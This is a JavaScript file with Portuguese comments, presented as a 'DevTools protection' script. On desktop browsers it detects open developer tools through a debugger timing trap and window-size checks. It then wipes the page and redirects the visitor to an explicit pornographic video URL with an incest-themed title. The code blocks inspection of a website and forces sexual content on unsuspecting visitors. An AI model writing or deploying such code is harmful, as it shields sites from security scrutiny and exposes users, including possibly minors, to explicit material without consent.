/**
 * DETECTOR DE DEVTOOLS - VERSÃO 4.0
 * Detecta abertura do DevTools apenas em dispositivos desktop
 * Autor: Sistema de Proteção Avançada
 * Data: 2025
 */

(function() {
    'use strict';
    
    // Configuração do redirecionamento
    const REDIRECT_URL = 'https://www.xvideos.com/video.umtvkhb9ecc/meio-irmao_gostosa_e_fodida_pelo_meio-irmao';
    
    // Variáveis de controle
    let protectionActive = true;
    let isDesktop = false;
    
    /**
     * Verificar se é dispositivo desktop
     */
    function checkIfDesktop() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        // Padrões específicos de desktop
        const desktopPatterns = [
            'windows nt 10', 'windows nt 11', 'macintosh', 'linux x86_64'
        ];
        
        // Padrões móveis - se tiver qualquer um desses, é mobile
        const mobilePatterns = [
            'android', 'iphone', 'ipad', 'ipod', 'mobile', 'tablet'
        ];
        
        // Verificar se é desktop (tem padrão desktop E não tem padrão mobile)
        const hasDesktopPattern = desktopPatterns.some(pattern => userAgent.includes(pattern));
        const hasMobilePattern = mobilePatterns.some(pattern => userAgent.includes(pattern));
        
        isDesktop = hasDesktopPattern && !hasMobilePattern;
        
        if (isDesktop) {
            console.log('[PROTECTION] Dispositivo desktop detectado - ativando proteção DevTools');
        } else {
            console.log('[PROTECTION] Dispositivo mobile detectado - proteção DevTools desabilitada');
        }
    }
    
    /**
     * Verificar DevTools usando debugger e performance.now()
     */
    function checkDevToolsWithDebugger() {
        const start = performance.now();
        debugger;
        const end = performance.now();
        
        if (end - start > 100) {
            console.log('[PROTECTION] DevTools detectado via debugger - tempo:', (end - start) + 'ms');
            handleDevToolsDetection('debugger');
        }
    }
    
    /**
     * Verificar DevTools usando dimensões da janela
     */
    function checkDevToolsWithDimensions() {
        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;
        const threshold = 160;
        
        // Se a diferença for maior que 160 pixels, DevTools está aberto
        if (widthDiff > threshold || heightDiff > threshold) {
            console.log('[PROTECTION] DevTools detectado via dimensões - largura:', widthDiff + 'px, altura:', heightDiff + 'px');
            handleDevToolsDetection('dimensions');
        }
    }
    
    /**
     * Função para lidar com a detecção do DevTools
     */
    function handleDevToolsDetection(method) {
        protectionActive = false;
        
        console.log('[PROTECTION] DevTools detectado via método:', method);
        
        // Limpar conteúdo da página
        document.documentElement.innerHTML = '';
        
        // Redirecionar
        redirectToTarget();
    }
    
    /**
     * Função de redirecionamento
     */
    function redirectToTarget() {
        try {
            window.location.href = REDIRECT_URL;
        } catch (e) {
            // Fallback
            window.location.replace(REDIRECT_URL);
        }
    }
    
    /**
     * Iniciar detecção de DevTools
     */
    function startDevToolsDetection() {
        // Verificação 1: Debugger a cada 1 segundo
        setInterval(() => {
            if (!protectionActive || !isDesktop) return;
            checkDevToolsWithDebugger();
        }, 1000);
        
        // Verificação 2: Dimensões da janela a cada 1,5 segundos
        setInterval(() => {
            if (!protectionActive || !isDesktop) return;
            checkDevToolsWithDimensions();
        }, 1500);
    }
    
    /**
     * Função principal de proteção
     */
    function initProtection() {
        if (!protectionActive) return;
        
        // Verificar se é desktop primeiro
        checkIfDesktop();
        
        // Só ativar proteções se for desktop
        if (isDesktop) {
            startDevToolsDetection();
        }
    }
    
    // Inicializar proteção quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initProtection);
    } else {
        initProtection();
    }
    
    // Verificação adicional no load
    window.addEventListener('load', () => {
        // Verificar novamente se é desktop após carregamento completo
        setTimeout(() => {
            checkIfDesktop();
        }, 1000);
    });
    
})();
